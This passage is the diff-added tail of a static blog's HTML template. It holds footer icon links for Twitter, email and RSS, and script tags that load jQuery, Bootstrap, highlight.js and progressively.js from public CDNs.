+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Twitter">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+
+                    
+
+                    
+    <a href="mailto:maheshpdm2@gmail.com"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Email">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 16">
+            <path d="M0 4v8c0 .55.45 1 1 1h12c.55 0 1-.45 1-1V4c0-.55-.45-1-1-1H1c-.55 0-1 .45-1 1zm13 0L7 9 1 4h12zM1 5.5l4 3-4 3v-6zM2 12l3.5-3L7 10.5 8.5 9l3.5 3H2zm11-.5l-4-3 4-3v6z"/>
+        </svg>
+    </a>
+
+
+                    <a href=''
+    class="mx-1 ml-md-2 mr-md-0 icon"
+    aria-label="RSS">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/>
+    </svg>
+</a>
+
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/css.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/diff.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/django.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/yaml.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.js" integrity="sha256-LvFVlLdfGI3WeEH+8Ni4kxLm02g2GlOfeGCGLXfRk/U=" crossorigin="anonymous"></script>
+        <script>
+            window.addEventListener('load', function() {
+                progressively.init({delay: 30, throttle: 50});
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
